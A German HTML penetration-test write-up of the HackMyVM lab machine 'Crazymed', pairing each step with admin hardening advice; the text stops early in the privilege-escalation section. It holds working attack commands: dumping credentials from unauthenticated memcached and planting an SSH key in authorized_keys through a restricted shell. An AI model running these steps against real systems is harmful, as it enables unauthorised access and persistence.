@@ -1,0 +1,818 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crazymed - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+
+    <!-- HINWEIS: Die Hintergrundfarbe für den Header wird durch CSS gesteuert (.header-bg) -->
+    <div class="header-bg">
+        <h1>Crazymed - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- HINWEIS: Die Farbe für 'Easy' (Lime/Grün) wird durch CSS gesteuert (h2 in .level-container) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                 <!-- HINWEIS: Die Hintergrundfarbe der Segmente (Lime/Grün) wird durch CSS gesteuert (.segment-*) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- HINWEIS: Die Hintergrundfarbe des inneren Kreises wird durch CSS gesteuert (.inner, passend zum Header) -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirsearch</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">memcdump</div>
+                <div class="tool-item">memccat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">lsb_release</div>
+                <div class="tool-item">pspy64</div>
+                <div class="tool-item">sleep</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">diff</div>
+                <div class="tool-item">ps</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">vi/nano (implied)</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">whoami</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#service-enumeration">Service Enumeration (Ports 4444 & 11211)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation via PATH Hijacking & SUID Bash)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der `arp-scan -l` Befehl wird verwendet, um aktive Geräte im lokalen Netzwerksegment zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert erfolgreich die IP-Adresse `192.168.2.107`. Die zugehörige MAC-Adresse `08:00:27:c4:c8:81` (PCS Systemtechnik GmbH) deutet auf eine VirtualBox-VM hin. Das Ziel für weitere Scans ist bekannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen detaillierten Nmap-Scan auf `192.168.2.107` durch.
+            <br><strong>Empfehlung (Admin):</strong> Standardmaßnahmen wie Netzwerküberwachung und Segmentierung anwenden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.107	08:00:27:c4:c8:81	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf das Ziel `192.168.2.107` durchgeführt, um offene Ports, Dienste, Versionen, OS und Skript-Ergebnisse zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet mehrere offene Ports:
+            *   **Port 22 (SSH):** `OpenSSH 8.4p1` auf Debian. Standard-Zugangspunkt, benötigt Credentials.
+            *   **Port 80 (HTTP):** `Apache httpd 2.4.54` auf Debian. Eine Webseite ("Crazymed Bootstrap Template") ist vorhanden.
+            *   **Port 4444 (krb524?):** Unbekannter Dienst. Nmap konnte ihn nicht identifizieren, aber er sendet Daten zurück (`fingerprint-strings`). Dies erfordert manuelle Untersuchung.
+            *   **Port 11211 (memcached):** `Memcached 1.6.9`. Ein In-Memory-Caching-System, das oft unauthentifiziert ist und sensible Daten enthalten kann.
+            *   **OS-Erkennung:** Linux (Debian).
+            Die offenen Ports 80, 4444 und 11211 sind die primären Angriffsvektoren.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie den Webserver (Port 80). Untersuchen Sie den unbekannten Dienst auf Port 4444 manuell (z.B. mit `nc`). Interagieren Sie mit dem Memcached-Dienst auf Port 11211, um zwischengespeicherte Daten abzufragen.
+            <br><strong>Empfehlung (Admin):</strong> Identifizieren Sie den Dienst auf Port 4444 und sichern Sie ihn oder deaktivieren Sie ihn, falls unnötig. Sichern Sie Memcached (Authentifizierung aktivieren, an localhost binden, wenn möglich). Härten Sie Apache und SSH.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.107 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 14:58 CET
+Nmap scan report for crazymed (192.168.2.107)
+Host is up (0.00010s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE   VERSION
+22/tcp    open  ssh       OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 dbfbb1fe039c173683ac6bc052ada005 (RSA)
+|   256 563b7ce3234a255abe54d12e9d449a06 (ECDSA)
+|_  256 81d42e473334a96f1070c19080aab66a (ED25519)
+80/tcp    open  http      Apache httpd 2.4.54 ((Debian))
+|_http-title: Crazymed Bootstrap Template - Index
+|_http-server-header: Apache/2.4.54 (Debian)
+4444/tcp  open  krb524?
+| fingerprint-strings:
+|   GetRequest:
+11211/tcp open  memcached Memcached 1.6.9 (uptime 79 seconds)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+[...]
+MAC Address: 08:00:27:C4:C8:81 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.10 ms crazymed (192.168.2.107)</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver (Port 80) eingesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden einige Verzeichnisse und eine Datei gefunden:
+            *   `/index.html`: Die Hauptseite der Crazymed-Vorlage.
+            *   `/assets/`: Standardverzeichnis für Web-Assets.
+            *   `/forms/`: Enthält wahrscheinlich Formulare (Kontakt, Termin etc.).
+            *   `/manual/`: Apache-Handbuchverzeichnis (oft auf Entwicklungs- oder Testsystemen vorhanden).
+            *   `/changelog.txt`: Könnte Versionsinformationen oder Hinweise auf verwendete Software/Änderungen enthalten.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt von `/changelog.txt`. Prüfen Sie die Formulare in `/forms/` auf Schwachstellen (z.B. XSS, CSRF - wie von Nikto später angedeutet). Untersuchen Sie das `/manual/`-Verzeichnis.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Dateien/Verzeichnisse wie `/manual` und `/changelog.txt` von Produktionsservern. Sichern Sie Webformulare gegen gängige Angriffe.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.107 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html...</span></div>
+                    <pre>
+http://192.168.2.107/index.html           (Status: 200) [Size: 51721]
+http://192.168.2.107/assets               (Status: 301) [Size: 315] [--> http://192.168.2.107/assets/]
+http://192.168.2.107/forms                (Status: 301) [Size: 314] [--> http://192.168.2.107/forms/]
+http://192.168.2.107/manual               (Status: 301) [Size: 315] [--> http://192.168.2.107/manual/]
+http://192.168.2.107/changelog.txt        (Status: 200) [Size: 2776]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver auf bekannte Schwachstellen und Konfigurationsprobleme zu scannen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto findet:
+            *   Fehlende Sicherheitsheader (X-Frame-Options, X-XSS-Protection, X-Content-Type-Options).
+            *   Mögliches Informationsleck durch ETags.
+            *   Erlaubte HTTP-Methoden: HEAD, GET, POST, OPTIONS.
+            *   Bestätigt das Vorhandensein von `/manual/` und Directory Indexing in `/manual/images/`.
+            Die Ergebnisse sind Standard und zeigen keine sofort ausnutzbaren kritischen Schwachstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nehmen Sie die fehlenden Header zur Kenntnis. Konzentrieren Sie sich auf die anderen offenen Ports (4444, 11211) und die Ergebnisse der Verzeichnissuche.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Entfernen Sie das `/manual`-Verzeichnis und deaktivieren Sie Directory Indexing.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.107</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.107
++ Target Hostname:    192.168.2.107
++ Target Port:        80
++ Start Time:         2022-11-02 15:10:08 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.54 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: ca09, size: 5ec267685ac00, mtime: gzip
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2022-11-02 15:10:53 (GMT1) (45 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Webseite wird manuell untersucht (impliziert), und eine Liste von Namen (Ärzte/Mitarbeiter) wird extrahiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Namen `Walter White`, `Sarah Jhonson`, `William Anderson`, `Amanda Jepson` könnten potenzielle Benutzernamen sein (z.B. `wwhite`, `sjhonson`, `wanderson`, `ajepson`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese Namen, um Benutzernamen zu generieren und für Brute-Force-Angriffe (SSH, Port 4444) oder als mögliche Werte für andere Angriffe zu testen.
+            <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, vollständige Namen von Mitarbeitern öffentlich preiszugeben, wenn dies nicht notwendig ist, da sie für Social Engineering oder Brute-Force verwendet werden können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, extrahierte Liste -->
+                    <pre>
+Liste von Webseite extrahiert:
+--------------------------------------
+Walter White
+Chief Medical Officer
+Sarah Jhonson
+Anesthesiologist
+William Anderson
+Cardiology
+Amanda Jepson</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `dirsearch` wird als Alternative zu `gobuster` verwendet, um Verzeichnisse zu suchen. Die Ergebnisse sind ähnlich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Verzeichnisse `/assets`, `/forms`, `/manual`. Findet zusätzlich `/server-status`, das aber mit 403 Forbidden antwortet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine neuen kritischen Pfade gefunden. Fokus bleibt auf den anderen Ports und den bereits bekannten Webpfaden.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `/server-status` (Apache-Statusmodul) angemessen geschützt ist (z.B. nur von localhost oder bestimmten IPs erlaubt).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirsearch -u http://192.168.2.107 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .git,php,html...</span></div>
+                    <pre>
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+[...]
+
+Target: http://192.168.2.107/
+
+[15:11:34] Starting:
+[15:11:35] 301 -  315B  - /assets  ->  http://192.168.2.107/assets/
+[15:11:35] 301 -  314B  - /forms  ->  http://192.168.2.107/forms/
+[15:11:35] 301 -  315B  - /manual  ->  http://192.168.2.107/manual/
+[15:15:07] 403 -  278B  - /server-status</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="service-enumeration">
+            <h2>Service Enumeration (Ports 4444 & 11211)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Eine manuelle Verbindung zum unbekannten Dienst auf Port 4444 wird mit `nc` hergestellt. Eine Willkommensnachricht wird angezeigt, und es wird nach einem Passwort gefragt. Der Versuch mit `admin` schlägt fehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass auf Port 4444 ein interaktiver Dienst läuft, der eine Authentifizierung erfordert. Der Name "Crazymed medical research laboratory" passt zum Thema der Webseite.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, das Passwort für diesen Dienst zu finden (z.B. durch Brute-Force mit den extrahierten Namen oder durch Informationen aus anderen Quellen wie Memcached).
+            <br><strong>Empfehlung (Admin):</strong> Identifizieren und sichern Sie diesen Dienst. Verwenden Sie starke Authentifizierung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc 192.168.2.107 4444</span></div>
+                    <pre>
+Welcome to the Crazymed medical research laboratory.
+All our tests are performed on human volunteers for a fee.
+
+
+Password: <span class="command">admin</span>
+Access denied.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird mit `nc` versucht, mit dem Memcached-Dienst auf Port 11211 zu interagieren. Verschiedene Memcached-Befehle (`version`, `stats`, `stats slabs`, `stats items`, `get domain`) werden gesendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Befehle sind erfolgreich und liefern Informationen über den Memcached-Server (Version 1.6.9, Laufzeit, Statistiken). Wichtig ist der Befehl `get domain`, der den Wert `crazymed` für den Schlüssel `domain` zurückgibt. Dies bestätigt den Domain-/Maschinennamen, liefert aber noch keine Zugangsdaten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Memcached ist offen und unauthentifiziert. Versuchen Sie, alle gespeicherten Schlüssel aufzulisten und ihre Werte abzurufen. Tools wie `memcdump` oder Skripte sind hierfür geeignet. Suchen Sie insbesondere nach Schlüsseln, die Passwörter oder Konfigurationsdaten enthalten könnten.
+            <br><strong>Empfehlung (Admin):</strong> Sichern Sie den Memcached-Dienst! Aktivieren Sie SASL-Authentifizierung und/oder binden Sie den Dienst an `127.0.0.1`, wenn er nur lokal benötigt wird. Firewall-Regeln können den Zugriff ebenfalls einschränken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "version" | nc -vn -w 1 192.168.2.107 11211</span></div>
+                    <pre>
+(UNKNOWN) [192.168.2.107] 11211 (?) open
+VERSION 1.6.9</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "stats" | nc -vn -w 1 192.168.2.107 11211</span></div>
+                    <pre>
+(UNKNOWN) [192.168.2.107] 11211 (?) open
+STAT pid 460
+STAT uptime 5551
+[...]
+END</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "stats slabs" | nc -vn -w 1 192.168.2.107 11211</span></div>
+                    <pre>
+(UNKNOWN) [192.168.2.107] 11211 (?) open
+STAT 1:chunk_size 96
+[...]
+END</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "stats items" | nc -vn -w 1 192.168.2.107 11211</span></div>
+                    <pre>
+(UNKNOWN) [192.168.2.107] 11211 (?) open
+STAT items:1:number 4
+[...]
+END</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "get domain"  | nc -vn -w 1 192.168.2.107 11211</span></div>
+                     <pre>
+(UNKNOWN) [192.168.2.107] 11211 (?) open
+VALUE domain 0 8
+crazymed
+END</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nmap-Skripte werden verwendet, um spezifische Informationen über Memcached zu sammeln (`memcached-info`) und auf bekannte Schwachstellen zu prüfen (`nmap-vulners`, `vuln`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+            *   `memcached-info`: Bestätigt die Version und dass keine Authentifizierung erforderlich ist (`Authentication: no`).
+            *   `vulners`/`vuln`: Findet einige potenzielle, niedrig bewertete CVEs für die OpenSSH-Version, die wahrscheinlich nicht direkt ausnutzbar sind. Für Apache werden mögliche CSRF-Schwachstellen in den Formularen gemeldet, was für Initial Access weniger relevant ist. Keine kritischen Schwachstellen für Memcached oder Apache gefunden.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Skripte bestätigen die Notwendigkeit, Memcached manuell zu dumpen, da keine direkten Schwachstellen gefunden wurden. Die SSH-CVEs sind unwahrscheinlich, können aber im Hinterkopf behalten werden.
+            <br><strong>Empfehlung (Admin):</strong> Patchen Sie SSH und Apache, um bekannte Schwachstellen zu schließen, auch wenn sie niedrig bewertet sind. Sichern Sie die Webformulare gegen CSRF.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -n -sV --script memcached-info -p 11211 192.168.2.107</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 22:36 CET
+Nmap scan report for 192.168.2.107
+Host is up (0.00015s latency).
+
+PORT      STATE SERVICE   VERSION
+11211/tcp open  memcached Memcached 1.6.9 (uptime 6651 seconds)
+| memcached-info:
+|   Process ID: 460
+|   Uptime: 6651 seconds
+|   Server time: 2022-11-02T21:36:31
+|   Architecture: 64 bit
+|   Used CPU (user): 0.729790
+|   Used CPU (system): 0.608158
+|   Current connections: 2
+|   Total connections: 5349
+|   Maximum connections: 1024
+|   TCP Port: 11211
+|   UDP Port: 0
+|_  Authentication: no
+MAC Address: 08:00:27:C4:C8:81 (Oracle VirtualBox virtual NIC)</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/usr/share/nmap/scripts]
+└─# <span class="command">nmap -sV --script nmap-vulners/ 192.168.2.107</span></div>
+                      <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 22:39 CET
+Nmap scan report for crazymed (192.168.2.107)
+Host is up (0.00012s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| vulners:
+|   cpe:/a:openbsd:openssh:8.4p1:
+|     	CVE-2021-28041	4.6	https://vulners.com/cve/CVE-2021-28041
+|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
+|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
+|     	CVE-2016-20012	4.3	https://vulners.com/cve/CVE-2016-20012
+|_    	CVE-2021-36368	2.6	https://vulners.com/cve/CVE-2021-36368
+[...]</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[/usr/…/scripts/vulscan/utilities/updater]
+└─# <span class="command">nmap -sV --script vuln 192.168.2.107</span></div>
+                       <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 22:45 CET
+[...]
+Nmap scan report for crazymed (192.168.2.107)
+Host is up (0.00014s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| vulners:
+|   cpe:/a:openbsd:openssh:8.4p1:
+|     	CVE-2021-28041	4.6	https://vulners.com/cve/CVE-2021-28041
+|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
+|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
+|     	CVE-2016-20012	4.3	https://vulners.com/cve/CVE-2016-20012
+|_    	CVE-2021-36368	2.6	https://vulners.com/cve/CVE-2021-36368
+80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
+| http-csrf:
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=crazymed
+|   Found the following possible CSRF vulnerabilities:
+|
+|     Path: http://crazymed:80/
+|     Form id: name
+|     Form action: forms/appointment.php
+|
+|     Path: http://crazymed:80/
+|     Form id: name
+|     Form action: forms/contact.php
+[...]
+| http-enum:
+|
+|   /forms/: Potentially interesting directory w/ listing on 'apache/2.4.54 (debian)'
+|_  /manual/: Potentially interesting folder
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `memcdump` wird verwendet, um alle Schlüssel aufzulisten, die im Memcached-Server gespeichert sind. Anschließend wird `memccat` verwendet, um die Werte der gefundenen Schlüssel abzurufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `memcdump` findet die Schlüssel `domain`, `server`, `log` und `conf_location`. `memccat` ruft deren Werte ab:
+            *   `domain`: `crazymed`
+            *   `server`: `127.0.0.1`
+            *   `log`: `password: cr4zyM3d`
+            *   `conf_location`: `/etc/memcached.conf`
+            Dies ist ein **kritischer Fund**! Der Wert des Schlüssels `log` enthält das Klartextpasswort `<span class="password">cr4zyM3d</span>`.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie sofort, dieses Passwort (`cr4zyM3d`) für den Dienst auf Port 4444 zu verwenden. Versuchen Sie es auch für den SSH-Benutzer `brad` (falls dieser Name aus anderen Quellen bekannt wäre oder als nächstes entdeckt wird).
+            <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Klartextpasswörter oder andere sensible Daten in Memcached, insbesondere wenn der Dienst unauthentifiziert ist! Sichern Sie Memcached wie zuvor empfohlen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">memcdump --servers=192.168.2.107</span></div>
+                      <pre>
+domain
+server
+log
+conf_location</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">memccat --servers=192.168.2.107 domain server log conf_location</span></div>
+                      <pre>
+crazymed
+127.0.0.1
+password: <span class="password">cr4zyM3d</span>
+/etc/memecacched.conf</pre> <!-- Typo im Original -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Erneute Verbindung zu Port 4444 mit `nc`. Diesmal wird das aus Memcached extrahierte Passwort (`cr4zyM3d`) verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich (`Access granted.`). Wir erhalten Zugang zu einer eingeschränkten Shell (`System command: `). Mit `?` werden die erlaubten Befehle angezeigt (`id`, `who`, `echo`, `clear`). Die Ausführung von `id` zeigt, dass wir als Benutzer `brad` (UID 1000) agieren. `whoami` bestätigt dies.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell ist sehr eingeschränkt. Prüfen Sie, ob `echo` verwendet werden kann, um Dateien zu schreiben, insbesondere um einen SSH-Schlüssel in `/home/brad/.ssh/authorized_keys` zu platzieren und so einen vollwertigen SSH-Zugang zu erhalten.
+            <br><strong>Empfehlung (Admin):</strong> Wenn eine eingeschränkte Shell bereitgestellt wird, stellen Sie sicher, dass sie wirklich sicher ist und keine Umgehungs- oder Eskalationsmöglichkeiten bietet (z.B. durch `echo`-Befehle oder ähnliches).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, nc Interaktion -->
+                     <pre>
+Welcome to the Crazymed medical research laboratory.
+All our tests are performed on human volunteers for a fee.
+
+
+Password: <span class="password">cr4zyM3d</span>
+Access granted.
+
+Type "?" for help.
+
+System command: <span class="command">?</span>
+Authorized commands: id who echo clear
+
+System command: <span class="command">id</span>
+uid=1000(brad) gid=1000(brad) groups=1000(brad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
+System command:
+
+System command: <span class="command">whoami</span>
+brad
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der `echo`-Befehl innerhalb der eingeschränkten Shell wird verwendet, um den öffentlichen SSH-Schlüssel des Angreifers in die Datei `/home/brad/.ssh/authorized_keys` zu schreiben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl wird ohne Fehlermeldung ausgeführt, was darauf hindeutet, dass er erfolgreich war. Dies nutzt die Schwäche der eingeschränkten Shell aus, die zwar nur wenige Befehle erlaubt, aber mit `echo` und Umleitungen das Schreiben von Dateien ermöglicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie nun, sich per SSH als `brad` mit dem entsprechenden privaten Schlüssel anzumelden.
+            <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Funktionalität von eingeschränkten Shells weiter. Verbieten Sie Umleitungen oder stellen Sie sicher, dass der Benutzer keine Schreibrechte auf kritische Orte wie `.ssh`-Verzeichnisse hat.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt, Interaktion mit der eingeschränkten Shell -->
+                      <pre>
+System command: <span class="command">echo "ssh-rsa  sshpubkey" > /home/brad/.ssh/authorized_keys</span>
+System command: </pre> <!-- sshpubkey ist hier ein Platzhalter -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Versuch, sich per SSH als `brad` mit dem zuvor platzierten Schlüssel anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login ist erfolgreich! Wir haben nun eine vollwertige interaktive Shell als Benutzer `brad`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Initial Access abgeschlossen. Beginnen Sie mit der Privilege Escalation Enumeration als `brad`.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins. Beheben Sie die Schwachstellen, die diesen Zugriff ermöglicht haben (unsicheres Memcached, unsichere eingeschränkte Shell auf Port 4444).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh brad@192.168.2.107</span></div>
+                      <pre>
+Enter passphrase for key '/root/.ssh/id_rsa':
+Linux crazymed 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Oct 31 18:36:58 2022 from 192.168.0.29
+
+brad@crazymed:~$ </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `brad` wird versucht, eine einfache PHP-Webshell (`ben.php`) in das Web-Root-Verzeichnis (`/var/www/html/`) zu schreiben. Es werden zwei Methoden gezeigt: eine direkte mit `echo` und eine Base64-kodierte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es ist unklar, ob `brad` Schreibrechte auf `/var/www/html/` hat. Standardmäßig sollte dies nicht der Fall sein. Wenn dies funktioniert, wäre es eine Fehlkonfiguration. Wenn nicht, ist dieser Schritt erfolglos. Das Platzieren einer Webshell ist normalerweise eher ein Schritt zur Persistenz oder zum Erleichtern weiterer Aktionen, weniger zur direkten PE.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie zuerst die Berechtigungen von `/var/www/html/`. Wenn schreibbar, kann die Webshell platziert werden. Fokussieren Sie sich aber primär auf Standard-PE-Vektoren: `sudo -l`, SUID-Binaries, Cron-Jobs etc.
